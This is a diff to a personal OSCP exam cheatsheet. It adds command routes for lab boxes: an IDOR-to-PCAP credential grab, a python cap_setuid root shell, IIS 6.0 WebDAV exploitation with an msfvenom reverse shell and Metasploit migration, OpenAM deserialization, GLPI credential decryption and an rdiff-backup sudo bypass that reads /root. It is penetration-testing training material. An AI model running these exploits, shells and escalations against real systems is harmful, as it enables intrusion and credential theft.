@@ -1,20 +1,20 @@
 ---
 tags: [OSCP, Cheatsheet, Commands, Exam]
 status: Maintained
-last_audited: 2026-09-14
+last_audited: 2026-09-15
 ---
 
 <!-- Living document: update after every box, module, or runbook change. -->
-<!-- Last full vault audit: 2026-09-14. Sources: all maintained command appendices, RUNBOOK V2, exam runbooks, methodology, modern tooling, modules, and box evidence, including the Legacy SMB/RPC route. -->
+<!-- Last full vault audit: 2026-09-15. Sources: all maintained command appendices, RUNBOOK V2, exam runbooks, methodology, modern tooling, modules, and box evidence, including the Management OpenAM/GLPI/rdiff route, Cap IDOR/PCAP/capability route, and Grandpa IIS WebDAV/migration/MS14-058 route. -->
 <!-- Use this as the speed sheet. Open the linked appendix or runbook when the branch needs explanation, caveats, or a longer procedure. -->
 
 # CTRL+F ANYTHING
 
 > [!tip] 💡 Starting a new box
-> Open [[RUNBOOK V2/00 - Follow-Along Controller|RUNBOOK V2 Follow-Along Controller]]. It gives the exact order, output decisions, failure routes, exploit-editing lane, and closeout steps. Use this sheet when you already know the technique and need a command quickly.
+> Open [[OSCP/RUNBOOK V2/00 - Follow-Along Controller|RUNBOOK V2 Follow-Along Controller]]. It gives the exact order, output decisions, failure routes, exploit-editing lane, and closeout steps. Use this sheet when you already know the technique and need a command quickly.
 
 > [!tip] 🛠️ Editing a public exploit
-> Open [[RUNBOOK V2/Exploit Editing and Resource Guide|Exploit Editing and Resource Guide]] before changing a PoC. It links the command, source-review, `nano` edit, syntax-check, payload, and troubleshooting sequence.
+> Open [[OSCP/RUNBOOK V2/Exploit Editing and Resource Guide|Exploit Editing and Resource Guide]] before changing a PoC. It links the command, source-review, `nano` edit, syntax-check, payload, and troubleshooting sequence.
 
 ## 0. START HERE: WORKSPACE, VARIABLES & EVIDENCE
 
@@ -60,7 +60,7 @@ Use the shortest page that answers the immediate question, then open the linked 
 
 | Need | Open |
 |---|---|
-| Blank-slate route and failure decisions | [[RUNBOOK V2/00 - Follow-Along Controller]] |
+| Blank-slate route and failure decisions | [[OSCP/RUNBOOK V2/00 - Follow-Along Controller]] |
 | Exact command families by topic | [[COMMAND APPENDIX/COMMAND APPENDIX]] |
 | Why a command works or fails | [[COMMAND BREAKDOWNS/COMMAND BREAKDOWNS]] |
 | “I found this; what next?” routing | [[DECISION TREE/DECISION TREE]] |
@@ -68,6 +68,7 @@ Use the shortest page that answers the immediate question, then open the linked 
 | Current tool syntax and caveats | [[MODERN TOOLING/MODERN TOOLING]] |
 | Fast exam execution route | [[EXAM RUNBOOK/Index]] |
 | Box-specific evidence and gotchas | [[BOXES/WRITE UPS/WRITE UPS]] |
+| Runbook decision path plus compact syntax | [[OSCP/RUNBOOK V2/00 - Follow-Along Controller|RUNBOOK V2 Follow-Along Controller]]; the runbook pages link back here for syntax |
 
 ## 1. RECON & PORT SCANNING
 
@@ -954,7 +955,7 @@ hostname
 > [!warning] 💡 CGI gotchas
 > A 403 directory response does not rule out a directly reachable CGI file. A timeout after the callback begins can be normal because the CGI process is attached to the shell. Keep $WebPort and $Lport distinct, and run reset locally if stty leaves the terminal garbled.
 
-See [[RUNBOOK V2/Linux - Shellshock CGI|Linux - Shellshock CGI]] and [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]].
+See [[OSCP/RUNBOOK V2/Linux - Shellshock CGI|Linux - Shellshock CGI]] and [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]].
 
 ### Stored browser callbacks
 
@@ -968,6 +969,41 @@ grep malicious.js $BoxDir/loot/callback.log
 ```
 
 ### SSRF, IDOR & request replay
+
+### Dashboard IDOR to PCAP credential recovery
+
+~~~bash
+# Compare the smallest adjacent object range and save both responses privately.
+curl -sS -D "$BoxDir/loot/data-0.headers" -o "$BoxDir/loot/data-0.html" \
+  "http://$BoxIP/data/0"
+curl -sS -D "$BoxDir/loot/data-1.headers" -o "$BoxDir/loot/data-1.html" \
+  "http://$BoxIP/data/1"
+wc -c "$BoxDir/loot/data-0.html" "$BoxDir/loot/data-1.html"
+
+# Follow the discovered download route and identify the artifact before parsing it.
+curl -sS -D "$BoxDir/loot/download-0.headers" \
+  -o "$BoxDir/loot/capture-0.pcap" "http://$BoxIP/download/0"
+file "$BoxDir/loot/capture-0.pcap"
+capinfos "$BoxDir/loot/capture-0.pcap"
+
+# Index protocols, then extract FTP authentication to a mode-600 private file.
+tshark -r "$BoxDir/loot/capture-0.pcap" -q -z io,phs \
+  | tee "$BoxDir/loot/capture-0.protocols.txt"
+tshark -r "$BoxDir/loot/capture-0.pcap" \
+  -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"' \
+  -T fields -e frame.number -e ftp.request.command -e ftp.request.arg \
+  > "$BoxDir/loot/capture-0.ftp-auth.raw"
+chmod 600 "$BoxDir/loot/capture-0.ftp-auth.raw"
+
+# Validate only the service suggested by the captured authentication.
+loot cred "$Username" "$Password"
+ssh "$Username@$BoxIP"
+id
+whoami
+hostname
+~~~
+
+Compare response status, redirects, body length, and body content; a 200 response may still be an empty record. A live FTP denial is separate from FTP authentication observed in a stored capture. Keep the PCAP and extracted fields private and route the decision logic through [[OSCP/RUNBOOK V2/Linux - IDOR and PCAP Credential Recovery|Linux - IDOR and PCAP Credential Recovery]] and [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]].
 
 ```bash
 # Confirm an SSRF parameter with a harmless local request first.
@@ -1146,7 +1182,7 @@ python3 "$BoxDir/exploits/49125.py" "$BoxIP" "$WebPort" "$HfsCommand"
 > [!warning] 💡 HFS gotcha
 > A successful HFS request does not prove a shell. Confirm the file-server access log, receive the callback, and run `whoami` before local enumeration. Keep the HFS port, transfer port, and callback port separate.
 
-See [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]], [[RUNBOOK V2/Windows - Exploit Search]], and [[COMMAND BREAKDOWNS/Web Applications (Breakdowns)|Web application breakdowns]].
+See [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]], [[OSCP/RUNBOOK V2/Windows - Exploit Search]], and [[COMMAND BREAKDOWNS/Web Applications (Breakdowns)|Web application breakdowns]].
 
 ### Legacy: MS08-067 manual SMB/RPC route
 
@@ -1259,7 +1295,154 @@ echo %username%
 
 `whoami` may not exist on XP, and a reverse-shell listener is the wrong direction for a bind payload. Keep flag values private in `$BoxDir/loot/flags.txt`; do not put them in this cheatsheet.
 
-See [[OSCP/BOXES/WRITE UPS/Windows/Legacy|Legacy]], [[RUNBOOK V2/Windows - SMB Enum]], [[RUNBOOK V2/Windows - Exploit Search]], and [[RUNBOOK V2/Windows - Shell Received]].
+See [[OSCP/BOXES/WRITE UPS/Windows/Legacy|Legacy]], [[OSCP/RUNBOOK V2/Windows - SMB Enum]], [[OSCP/RUNBOOK V2/Windows - Exploit Search]], and [[OSCP/RUNBOOK V2/Windows - Shell Received]].
+
+### Grandpa: IIS 6.0 WebDAV CVE-2017-7269 and legacy kernel triage
+
+Use this sequence when IIS 6.0 exposes WebDAV on an old Windows target. Each command is separated and numbered so the run can be followed manually. The complete failure analysis and the technically necessary staged-migration route are in [[OSCP/BOXES/WRITE UPS/Windows/Grandpa|Grandpa]].
+
+1. Confirm the full TCP surface:
+
+~~~bash
+sudo nmap -Pn -n -sT -p- --min-rate 2000 "$BoxIP" -oA "$BoxDir/nmap/allports"
+~~~
+
+2. Fingerprint IIS and request WebDAV-specific scripts:
+
+~~~bash
+sudo nmap -Pn -n -sT -sV -sC -p "$WebPort" \
+  --script http-title,http-headers,http-methods,http-webdav-scan \
+  "$BoxIP" -oA "$BoxDir/nmap/services"
+~~~
+
+3. Confirm HTTP behavior and methods manually:
+
+~~~bash
+curl -i "http://$BoxIP:$WebPort/"
+~~~
+
+~~~bash
+curl -i -X OPTIONS "http://$BoxIP:$WebPort/"
+~~~
+
+4. Search, inspect, and copy the public PoC:
+
+~~~bash
+searchsploit "IIS 6.0 WebDAV"
+~~~
+
+~~~bash
+searchsploit -x "$ExploitId"
+~~~
+
+~~~bash
+searchsploit -m "$ExploitId"
+~~~
+
+~~~bash
+cp "$ExploitFile" "$BoxDir/exploits/41738.py"
+~~~
+
+5. Preserve and syntax-check the Python 3 adaptation. Compare parsed escape-sequence bytes against the original; `py_compile` cannot catch a wrong `\\xNN` value:
+
+~~~bash
+cp "$BoxDir/exploits/41738.py" "$BoxDir/exploits/41738.original.py"
+~~~
+
+~~~bash
+python3 -m py_compile "$BoxDir/exploits/41738-adapted.py"
+~~~
+
+6. Generate the constrained manual payload:
+
+~~~bash
+msfvenom -p windows/shell_reverse_tcp \
+  LHOST="$LocalIP" LPORT="$Port" EXITFUNC=thread \
+  -e x86/alpha_mixed BufferRegister=EAX -f python
+~~~
+
+7. Capture the callback path before the exploit request:
+
+~~~bash
+sudo tcpdump -ni tun0 -n "host $BoxIP and tcp port $Port" \
+  -w "$BoxDir/loot/webdav-callback.pcap"
+~~~
+
+~~~bash
+nc -lvnp "$Port"
+~~~
+
+8. Run the reviewed manual PoC and record status, delay, listener, and packet evidence:
+
+~~~bash
+python3 "$BoxDir/exploits/41738-adapted.py" "$BoxIP" "$WebPort"
+~~~
+
+9. If testing a bind payload, connect as a client and treat an RST as evidence rather than shell proof:
+
+~~~bash
+nc -v "$BoxIP" "$Port"
+~~~
+
+10. If the response changes to immediate RSTs after repeated crashes, stop testing and recover IIS Rapid Fail Protection. A raw socket hosted inside `w3wp.exe` may die with the worker process. If migration is required, follow the exact staged Meterpreter route in [[OSCP/BOXES/WRITE UPS/Windows/Grandpa|Grandpa]] and [[OSCP/MODULES/21. The Metasploit Framework|Module 21]].
+
+11. If the raw shell cannot outlive `w3wp.exe`, use the technically necessary staged framework route and migrate immediately:
+
+~~~text
+msfconsole -q
+~~~
+
+~~~text
+use exploit/windows/iis/iis_webdav_scstoragepathfromurl
+~~~
+
+~~~text
+set RHOSTS $BoxIP
+~~~
+
+~~~text
+set LHOST $LocalIP
+~~~
+
+~~~text
+set LPORT $MigrationPort
+~~~
+
+~~~text
+set AutoRunScript post/windows/manage/migrate
+~~~
+
+~~~text
+run
+~~~
+
+This is the Grandpa exception: the staged session migrates out of the vulnerable IIS worker before it dies. Document the manual PoC diagnosis and the reason for this framework boundary in [[OSCP/BOXES/WRITE UPS/Windows/Grandpa|Grandpa]].
+
+12. After a stable migrated session, record the legacy host and token context:
+
+~~~cmd
+systeminfo
+~~~
+
+~~~cmd
+wmic qfe get HotFixID,InstalledOn
+~~~
+
+~~~cmd
+whoami /all
+~~~
+
+13. Verify the new elevated session with `getuid` and `whoami` after the reviewed MS14-058 local module returns:
+
+~~~text
+getuid
+~~~
+
+~~~cmd
+whoami
+~~~
+
+Keep flags, credentials, packet captures, raw exploit logs, and screenshots in the private `$BoxDir`; do not place their values in this sheet.
 
 ```bash
 # Search by product and version
@@ -1875,7 +2058,7 @@ whoami
 
 > [!warning] 💡 Use the executable path and argument shape shown by sudo -l. The Perl escape is valid only when that exact interpreter is approved without a password.
 
-See [[RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]] and [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]].
+See [[OSCP/RUNBOOK V2/Linux - Sudo Check|Linux - Sudo Check]] and [[OSCP/BOXES/WRITE UPS/Linux/Shocker|Shocker]].
 
 ### Linux escalation branches: containers, filesystems, libraries and legacy kernels
 
@@ -1908,6 +2091,12 @@ lxc exec "$Container" /bin/sh
 
 # Capabilities and AppArmor evidence.
 getcap -r / 2>/dev/null
+
+# A versioned interpreter with cap_setuid is a direct escalation candidate.
+getcap /usr/bin/python3.8
+/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+id
+whoami
 
 aa-status 2>/dev/null
 
@@ -1955,6 +2144,8 @@ find "$LibraryDir" -type f -writable -ls 2>/dev/null
 
 readelf -d "$Binary" | grep -E 'RPATH|RUNPATH|NEEDED'
 ```
+
+See [[OSCP/RUNBOOK V2/Linux - File Capabilities|Linux - File Capabilities]] and [[OSCP/BOXES/WRITE UPS/Linux/Cap|Cap]] for the capability decision branch.
 
 > [!warning] 💡 Linux escalation gotcha
 > Membership in `docker`, `lxd`, `disk`, or `adm` is a lead, not proof. Verify the exact device, socket, export, container image, or readable log and preserve the original state before changing anything.
@@ -2071,6 +2262,22 @@ whoami
 > Sherlock can report MS16-032 as appearing vulnerable, but its exploit checks the processor count and exits on a single-CPU host. Read `systeminfo` before choosing that route. Optimum used MS16-098, CVE-2016-3309, from a clean native callback instead.
 
 See [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]] and [[COMMAND APPENDIX/Windows Privilege Escalation|Windows privilege escalation]].
+
+### Legacy Windows kernel triage: MS14-058
+
+```cmd
+systeminfo
+```
+
+```cmd
+wmic qfe get HotFixID,InstalledOn
+```
+
+```cmd
+whoami /all
+```
+
+Use the local exploit-suggester output to match `ms14_058_track_popup_menu` to the exact build, architecture, token, and stable session. If the foothold came from IIS WebDAV, migrate out of `w3wp.exe` before local escalation. The exact framework commands and the worker-process rationale are in [[OSCP/BOXES/WRITE UPS/Windows/Grandpa|Grandpa]] and [[OSCP/MODULES/21. The Metasploit Framework|Module 21]].
 
 ### Windows escalation branches: policy, tokens, services and credentials
 
@@ -2977,3 +3184,70 @@ whoami
 ```
 
 The header name has two `t` characters. Prove `id` before requesting a callback, stabilise the callback with the Linux shell page, and keep the root proof private.
+
+## 18. MANAGEMENT: OPENAM, GLPI, AND RDIFF-BACKUP
+
+### OpenAM JATO deserialization
+
+```bash
+# Preserve the SSO hostname because OpenAM routing and TLS are host-sensitive.
+SsoFQDN="sso.$Domain"
+
+curl -skI --resolve "$SsoFQDN:443:$BoxIP" \
+  "https://$SsoFQDN/openam/ui/PWResetUserValidation"
+
+# Clone and review the matching PoC in the private workspace before execution.
+git clone https://github.com/TheMalwareGuardian/CVE-2026-33439.git \
+  "$BoxDir/exploits/cve-2026-33439"
+
+cd "$BoxDir/exploits/cve-2026-33439"
+python3 exploit.py --help
+sed -n '1,260p' exploit.py
+
+# Prove a low-impact command before requesting a callback.
+python3 exploit.py \
+  --url "https://$SsoFQDN/openam/ui/PWResetUserValidation" \
+  'id'
+```
+
+See [[OSCP/RUNBOOK V2/Linux - OpenAM JATO Deserialization|Linux - OpenAM JATO Deserialization]] for endpoint validation, source review, response-channel proof, and callback troubleshooting.
+
+### Application-encrypted credential pivot
+
+```bash
+# Search the readable application for the key, primitive, nonce, and field names.
+grep -RniE 'key|crypt|encrypt|decrypt|nonce|secret|password' \
+  /opt /var/www 2>/dev/null
+
+grep -RniE 'sodium_crypto|openssl_decrypt|base64_decode' \
+  /opt /var/www 2>/dev/null
+
+# Query only the application database after the connection details and grants are confirmed.
+mysql -h "$BoxIP" -u "$DbUser" -p "$DbName" \
+  -e 'SHOW GRANTS; SELECT * FROM glpi_authldaps\G' \
+  | tee "$BoxDir/loot/application-auth-record.txt"
+```
+
+Reproduce the application's exact nonce, associated-data, encoding, and key handling in a local one-liner or small script. Keep the decrypted value in private loot and validate it once against the most likely service; do not paste it into the vault.
+
+See [[OSCP/RUNBOOK V2/Linux - Credential Search|Linux - Credential Search]] and [[OSCP/RUNBOOK V2/Linux - Database Access|Linux - Database Access]] for the evidence and validation branch.
+
+### rdiff-backup wildcard restriction abuse
+
+```bash
+# Preserve the complete sudo rule and the installed parser version.
+sudo -n -l
+command -v rdiff-backup
+rdiff-backup --version
+
+# Read-only proof: keep the fixed server arguments, add the duplicate root path,
+# and use #{h} so rdiff-backup v2 accepts the local remote-schema form.
+mkdir -p "$BoxDir/loot/rdiff-root"
+rdiff-backup \
+  --remote-schema "sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path / #{h}" \
+  backup localhost::/root "$BoxDir/loot/rdiff-root"
+
+find "$BoxDir/loot/rdiff-root" -maxdepth 3 -type f -printf '%p\n'
+```
+
+The duplicate restriction is parser- and version-dependent. Confirm the exact sudo rule, preserve the stderr transcript, and read only the proof file required for the exercise. See [[OSCP/RUNBOOK V2/Linux - Rdiff-Backup Sudo Abuse|Linux - Rdiff-Backup Sudo Abuse]] and [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]].
